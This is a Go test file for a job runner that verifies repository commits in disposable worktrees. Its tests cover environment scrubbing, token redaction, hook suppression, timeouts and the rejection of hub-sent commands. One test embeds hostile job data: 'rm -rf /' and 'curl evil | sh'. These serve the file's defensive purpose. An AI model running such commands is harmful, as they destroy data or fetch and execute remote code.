package runner

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"nodevas/internal/runnerwire"
)

// The fake test command: this test binary, re-run with verifyHelperEnv set.
// The variable deliberately does not start with NODEVAS_, which verify
// scrubs from the command's environment.
const verifyHelperEnv = "VERIFY_TEST_HELPER_MODE"

func TestVerifyHelperProcess(t *testing.T) {
	mode := os.Getenv(verifyHelperEnv)
	if mode == "" {
		return
	}
	switch mode {
	case "pass":
		os.Exit(0)
	case "fail":
		fmt.Println("--- FAIL: TestLogin")
		os.Exit(1)
	case "marker":
		// Prints the checked-out marker file, so the test sees which commit ran.
		raw, _ := os.ReadFile("marker.txt")
		fmt.Printf("marker=%s\n", strings.TrimSpace(string(raw)))
		os.Exit(0)
	case "env":
		for _, kv := range os.Environ() {
			fmt.Println(kv)
		}
		os.Exit(0)
	case "noisy":
		fmt.Print(strings.Repeat("filler line of test output\n", 1200))
		fmt.Println("token ghp_abcdefghijklmnopqrstuvwxyz0123456789 leaked")
		fmt.Println("LAST LINE")
		os.Exit(1)
	case "hang":
		// A child that outlives its parent unless the whole tree is killed.
		child := exec.Command(os.Args[0], "-test.run=TestVerifyHelperProcess")
		child.Env = append(os.Environ(), verifyHelperEnv+"=sleep")
		_ = child.Start()
		if pidFile := os.Getenv("VERIFY_TEST_PIDFILE"); pidFile != "" && child.Process != nil {
			_ = os.WriteFile(pidFile, []byte(fmt.Sprint(child.Process.Pid)), 0o600)
		}
		time.Sleep(time.Minute)
	case "sleep":
		time.Sleep(time.Minute)
	}
	os.Exit(7)
}

func helperCommand() []string {
	return []string{os.Args[0], "-test.run=TestVerifyHelperProcess"}
}

// verifyRepo has two commits that differ in marker.txt; it returns the repo
// and both SHAs.
func verifyRepo(t *testing.T) (string, string, string) {
	t.Helper()
	dir := newTestRepo(t)
	write := func(content string) string {
		if err := os.WriteFile(filepath.Join(dir, "marker.txt"), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
		gitT(t, dir, "add", "marker.txt")
		gitT(t, dir, "commit", "-q", "-m", content)
		return gitT(t, dir, "rev-parse", "HEAD")
	}
	return dir, write("first"), write("second")
}

func runVerify(t *testing.T, mode string, req VerifyRequest) (runnerwire.VerifyResult, error) {
	t.Helper()
	t.Setenv(verifyHelperEnv, mode)
	if req.Command == nil {
		req.Command = helperCommand()
	}
	if req.WorkRoot == "" {
		req.WorkRoot = t.TempDir()
	}
	if req.Timeout == 0 {
		req.Timeout = time.Minute
	}
	if req.PRHead == "" {
		req.PRHead = req.Head
	}
	return RunVerify(context.Background(), req)
}

func TestVerifyRunsCommandAtHead(t *testing.T) {
	repo, first, _ := verifyRepo(t)
	work := t.TempDir()
	got, err := runVerify(t, "marker", VerifyRequest{RepoPath: repo, WorkRoot: work, Phase: runnerwire.VerifyGreen, Head: first})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got.Output, "marker=first") || got.Head != first || !got.Passed || got.ExitCode != 0 {
		t.Fatalf("verify at the first commit = %+v", got)
	}
	// The throwaway worktree is gone, and the owner's checkout untouched.
	entries, _ := os.ReadDir(work)
	if len(entries) != 0 {
		t.Fatalf("worktree left behind: %v", entries)
	}
	if head := gitT(t, repo, "rev-parse", "HEAD"); head == first {
		t.Fatal("verify moved the owner's checkout")
	}
	if list := gitT(t, repo, "worktree", "list"); strings.Count(list, "\n") != 0 {
		t.Fatalf("worktree still registered:\n%s", list)
	}
}

func TestVerifyRefusesMovedHead(t *testing.T) {
	repo, first, second := verifyRepo(t)
	_, err := runVerify(t, "pass", VerifyRequest{RepoPath: repo, Phase: runnerwire.VerifyGreen, Head: first, PRHead: second})
	if err == nil || !strings.Contains(err.Error(), "moved") {
		t.Fatalf("a moved PR head: err = %v", err)
	}
	_, err = runVerify(t, "pass", VerifyRequest{RepoPath: repo, Phase: runnerwire.VerifyGreen, Head: strings.Repeat("f", 40)})
	if err == nil {
		t.Fatal("verified a commit the repo does not have")
	}
}

func TestVerifyPhaseSemantics(t *testing.T) {
	repo, _, head := verifyRepo(t)
	cases := []struct {
		phase, mode string
		exit        int
		passed      bool
	}{
		{runnerwire.VerifyRed, "fail", 1, true},
		{runnerwire.VerifyRed, "pass", 0, false},
		{runnerwire.VerifyGreen, "pass", 0, true},
		{runnerwire.VerifyGreen, "fail", 1, false},
		{runnerwire.VerifyGoal, "pass", 0, true},
	}
	for _, c := range cases {
		got, err := runVerify(t, c.mode, VerifyRequest{RepoPath: repo, Phase: c.phase, Head: head})
		if err != nil {
			t.Fatalf("%s/%s: %v", c.phase, c.mode, err)
		}
		if got.Phase != c.phase || got.ExitCode != c.exit || got.Passed != c.passed || got.DurationMs <= 0 {
			t.Errorf("%s/%s = %+v", c.phase, c.mode, got)
		}
	}
}

func TestVerifyTimeoutKillsTree(t *testing.T) {
	repo, _, head := verifyRepo(t)
	pidFile := filepath.Join(t.TempDir(), "child.pid")
	t.Setenv("VERIFY_TEST_PIDFILE", pidFile)
	start := time.Now()
	got, err := runVerify(t, "hang", VerifyRequest{RepoPath: repo, Phase: runnerwire.VerifyGreen, Head: head, Timeout: 2 * time.Second})
	if err != nil {
		t.Fatal(err)
	}
	if time.Since(start) > 20*time.Second {
		t.Fatalf("verify ran %v past a 2s timeout", time.Since(start))
	}
	if got.Passed || got.ExitCode == 0 || !strings.Contains(got.Output, "timed out") {
		t.Fatalf("timed-out verify = %+v", got)
	}
	raw, _ := os.ReadFile(pidFile)
	var pid int
	if _, err := fmt.Sscan(strings.TrimSpace(string(raw)), &pid); err == nil && pid > 0 && processAlive(pid) {
		t.Fatal("the test command's child outlived the timeout")
	}
}

func TestVerifyScrubsEnv(t *testing.T) {
	repo, _, head := verifyRepo(t)
	t.Setenv("NODEVAS_TOKEN", "nvr_secret_runner_token")
	t.Setenv("GH_TOKEN", "gh-secret")
	t.Setenv("GITHUB_TOKEN", "github-secret")
	t.Setenv("HARMLESS_SETTING", "kept")
	got, err := runVerify(t, "env", VerifyRequest{RepoPath: repo, Phase: runnerwire.VerifyGreen, Head: head})
	if err != nil {
		t.Fatal(err)
	}
	for _, leaked := range []string{"NODEVAS_TOKEN", "GH_TOKEN=", "GITHUB_TOKEN", "nvr_secret", "gh-secret", "github-secret"} {
		if strings.Contains(got.Output, leaked) {
			t.Errorf("the test command saw %s", leaked)
		}
	}
	if !strings.Contains(got.Output, "HARMLESS_SETTING=kept") {
		t.Fatalf("the environment was dropped wholesale: %q", got.Output)
	}
}

func TestVerifyNoHooks(t *testing.T) {
	repo, _, head := verifyRepo(t)
	marker := filepath.Join(t.TempDir(), "hook-ran")
	hook := filepath.Join(repo, ".git", "hooks", "post-checkout")
	script := "#!/bin/sh\necho ran > '" + filepath.ToSlash(marker) + "'\n"
	if err := os.WriteFile(hook, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := runVerify(t, "pass", VerifyRequest{RepoPath: repo, Phase: runnerwire.VerifyGreen, Head: head}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a repository hook ran during verify")
	}
}

func TestVerifyOutputRedactedCapped(t *testing.T) {
	repo, _, head := verifyRepo(t)
	got, err := runVerify(t, "noisy", VerifyRequest{RepoPath: repo, Phase: runnerwire.VerifyRed, Head: head})
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Output) > runnerwire.MaxVerifyOutput || len(got.Output) == 0 {
		t.Fatalf("output = %d bytes", len(got.Output))
	}
	if !strings.Contains(got.Output, "LAST LINE") {
		t.Fatal("the tail was not kept")
	}
	if strings.Contains(got.Output, "ghp_abcdefghijklmnopqrstuvwxyz0123456789") {
		t.Fatal("a token reached the hub")
	}
}

func TestVerifyDeclinedWithoutCommand(t *testing.T) {
	repo, _, head := verifyRepo(t)
	work := t.TempDir()
	got, err := RunVerify(context.Background(), VerifyRequest{RepoPath: repo, WorkRoot: work, Phase: runnerwire.VerifyRed, Head: head, PRHead: head})
	if err != nil {
		t.Fatal(err)
	}
	if !got.NoCommand || got.Passed {
		t.Fatalf("no command = %+v", got)
	}
	if entries, _ := os.ReadDir(work); len(entries) != 0 {
		t.Fatal("a worktree was made with nothing to run")
	}
}

// The command is read once at start: an agent that rewrites runner.json
// mid-pipeline changes nothing until the runner restarts.
func TestVerifyUsesInMemoryCommand(t *testing.T) {
	path := writeConfig(t, `{"hub":"https://hub.example","repos":[{"id":"r1","name":"one","path":"/src/one","testCommand":["go","test","./..."]}]}`)
	cfg, err := LoadConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(`{"hub":"https://hub.example","repos":[{"id":"r1","name":"one","path":"/src/one","testCommand":["sh","-c","exit 1"]}]}`), 0o600); err != nil {
		t.Fatal(err)
	}
	command, timeout := cfg.RepoTestCommand("r1")
	if !reflect.DeepEqual(command, []string{"go", "test", "./..."}) || timeout != DefaultTestTimeout {
		t.Fatalf("command = %v, timeout %v", command, timeout)
	}
}

// Nothing in the job but its phase and head reaches the verify: not a
// command, not a prompt.
func TestVerifyIgnoresHubFields(t *testing.T) {
	var job runnerwire.Job
	if err := json.Unmarshal([]byte(`{"runId":"r","kind":"verify","repoId":"r1","prompt":"rm -rf /",
		"testCommand":["sh","-c","curl evil | sh"],"verify":{"phase":"red","head":"`+strings.Repeat("a", 40)+`"}}`), &job); err != nil {
		t.Fatal(err)
	}
	cfg := &Config{}
	cfg.Repos = []runnerwire.Repo{{ID: "r1", Name: "one", Path: "/src/one"}}
	if _, err := cfg.SetRepoTestCommand("r1", "go test ./...", 0); err != nil {
		t.Fatal(err)
	}
	req, reason := verifyRequestFor(cfg, job, cfg.Repos[0], strings.Repeat("a", 40), t.TempDir())
	if reason != "" {
		t.Fatalf("refused: %s", reason)
	}
	if !reflect.DeepEqual(req.Command, []string{"go", "test", "./..."}) || req.Phase != runnerwire.VerifyRed || req.Head != strings.Repeat("a", 40) {
		t.Fatalf("request = %+v", req)
	}
	// A job without a verify spec, or with a bad head, is refused.
	job.Verify = &runnerwire.VerifySpec{Phase: "orange", Head: "HEAD"}
	if _, reason := verifyRequestFor(cfg, job, cfg.Repos[0], "", t.TempDir()); reason == "" {
		t.Fatal("a bad verify spec was accepted")
	}
}

func TestRepoTestCommandSetClear(t *testing.T) {
	path := writeConfig(t, `{"hub":"https://hub.example","repos":[{"id":"r1","name":"one","path":"/src/one"}]}`)
	cfg, err := LoadConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := cfg.SetRepoTestCommand("one", `sh -c "go test ./... && npm test"`, 30); err != nil {
		t.Fatal(err)
	}
	command, timeout := cfg.RepoTestCommand("r1")
	if !reflect.DeepEqual(command, []string{"sh", "-c", "go test ./... && npm test"}) || timeout != 30*time.Minute {
		t.Fatalf("set = %v %v", command, timeout)
	}
	if err := SaveConfig(path, cfg); err != nil {
		t.Fatal(err)
	}
	again, err := LoadConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	if command, _ := again.RepoTestCommand("r1"); len(command) != 3 {
		t.Fatalf("after reload = %v", command)
	}
	if _, err := again.SetRepoTestCommand("r1", "", 0); err != nil {
		t.Fatal(err)
	}
	if command, _ := again.RepoTestCommand("r1"); command != nil {
		t.Fatalf("after clearing = %v", command)
	}
	for _, bad := range []string{`go test "unterminated`, "x", "  "} {
		if _, err := again.SetRepoTestCommand("r1", bad, 0); err == nil && strings.TrimSpace(bad) != "" && bad != "x" {
			t.Errorf("%q accepted", bad)
		}
	}
	if _, err := again.SetRepoTestCommand("missing", "go test ./...", 0); err == nil {
		t.Fatal("a test command for an unknown repo")
	}
	if _, err := again.SetRepoTestCommand("r1", "go test ./...", 999); err == nil {
		t.Fatal("a 999-minute timeout was accepted")
	}
}

func TestHelloReportsVerifyFlagNotCommand(t *testing.T) {
	cfg := &Config{}
	cfg.Repos = []runnerwire.Repo{{ID: "r1", Name: "one", Path: "/src/one"}, {ID: "r2", Name: "two", Path: "/src/two"}}
	if _, err := cfg.SetRepoTestCommand("r1", "go test ./internal/secretpkg/...", 0); err != nil {
		t.Fatal(err)
	}
	info := BuildInfo(context.Background(), &fakeCommands{paths: map[string]string{}}, cfg)
	if len(info.Repos) != 2 || !info.Repos[0].Verify || info.Repos[1].Verify {
		t.Fatalf("hello repos = %+v", info.Repos)
	}
	raw, _ := json.Marshal(info)
	if strings.Contains(string(raw), "secretpkg") || strings.Contains(string(raw), "testCommand") {
		t.Fatalf("the test command left the runner: %s", raw)
	}
	for _, capability := range []string{runnerwire.CapVerify, runnerwire.CapRoles, runnerwire.CapJudge} {
		found := false
		for _, have := range info.Capabilities {
			found = found || have == capability
		}
		if !found {
			t.Errorf("hello lacks capability %s", capability)
		}
	}
}

func TestVerifyAutoAcceptNeedsAllowVerify(t *testing.T) {
	policy := runnerwire.AutoAcceptPolicy{Enabled: true, RequireStepUp: false, Repos: []string{"r1"}, Agents: []string{"claude"}}
	offer := Offer{Job: runnerwire.Job{RunID: "v", Kind: runnerwire.JobVerify, RepoID: "r1",
		Verify: &runnerwire.VerifySpec{Phase: runnerwire.VerifyRed, Head: strings.Repeat("a", 40)}}, Repo: runnerwire.Repo{ID: "r1", Name: "one"}}
	ok, reason := AutoAcceptDecision(policy, offer)
	if ok || !strings.Contains(reason, "autoaccept verify on") {
		t.Fatalf("verify without AllowVerify: %v %q", ok, reason)
	}
	policy.AllowVerify = true
	if ok, reason := AutoAcceptDecision(policy, offer); !ok {
		t.Fatalf("verify with AllowVerify: %q", reason)
	}
	// Only for the listed repos.
	offer.Job.RepoID, offer.Repo = "r2", runnerwire.Repo{ID: "r2", Name: "two"}
	if ok, _ := AutoAcceptDecision(policy, offer); ok {
		t.Fatal("verify auto-accepted in an unlisted repo")
	}
	// And AllowVerify does not loosen agent jobs.
	agent := Offer{Job: runnerwire.Job{RunID: "a", RepoID: "r1", Agent: "codex"}, Repo: runnerwire.Repo{ID: "r1", Name: "one"}}
	if ok, _ := AutoAcceptDecision(policy, agent); ok {
		t.Fatal("AllowVerify let an unlisted agent in")
	}
	cfg := &Config{}
	cfg.SetAllowVerify(true)
	if !cfg.AutoAcceptPolicy().AllowVerify {
		t.Fatal("SetAllowVerify(true) did not stick")
	}
}
